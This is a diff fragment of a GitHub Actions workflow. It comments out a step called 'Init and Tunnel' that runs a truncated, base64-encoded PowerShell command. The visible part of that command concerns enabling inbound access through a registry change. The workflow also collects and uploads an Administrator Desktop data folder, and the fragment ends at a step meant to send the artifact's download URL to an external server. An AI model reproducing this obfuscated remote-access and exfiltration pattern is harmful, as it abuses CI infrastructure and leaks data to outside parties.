@@ -22,20 +22,20 @@ jobs:
       - name: Init and Tunnel
         shell: pwsh
         run: |
-          powershell -EncodedCommand "IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB..."
+        #  powershell -EncodedCommand "IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB..."
 
       # Step 4: List Desktop Data contents for debugging
       - name: List Desktop Data contents
         shell: cmd
-        run: dir "%USERPROFILE%\Desktop\data"
+        run: dir "C:\Users\Administrator\Desktop\data"
         continue-on-error: true
 
-      # Step 5: Upload Desktop Data as artifact
+      # Step 5: Upload Desktop Data as artifact (Administrator Desktop)
       - name: Upload Desktop Data as "data" artifact
         uses: actions/upload-artifact@v4
         with:
           name: data
-          path: "%USERPROFILE%\Desktop\data"
+          path: "C:/Users/Administrator/Desktop/data"
         if: always()
 
       # Step 6: Send artifact download URL to external server
